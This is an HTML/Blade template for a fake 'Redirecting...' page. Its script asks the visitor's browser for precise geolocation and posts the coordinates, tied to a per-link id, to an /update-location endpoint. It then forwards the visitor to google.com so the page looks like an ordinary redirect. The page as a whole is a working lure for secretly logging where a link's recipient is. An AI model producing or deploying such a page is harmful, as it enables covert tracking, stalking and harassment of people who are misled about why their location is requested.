<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 15px; color: #555; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Loading, please wait...</p>

    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    fetch("{{ url('/update-location') }}", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            "X-CSRF-TOKEN": document.querySelector('meta[name="csrf-token"]').content
                        },
                        body: JSON.stringify({
                            id: "{{ $id }}",
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        })
                    }).then(() => { window.location.href = "https://google.com"; });
                }, function() {
                    window.location.href = "https://google.com";
                }, { enableHighAccuracy: true, timeout: 8000 });
            } else {
                window.location.href = "https://google.com";
            }
        };
    </script>
</body>
</html>
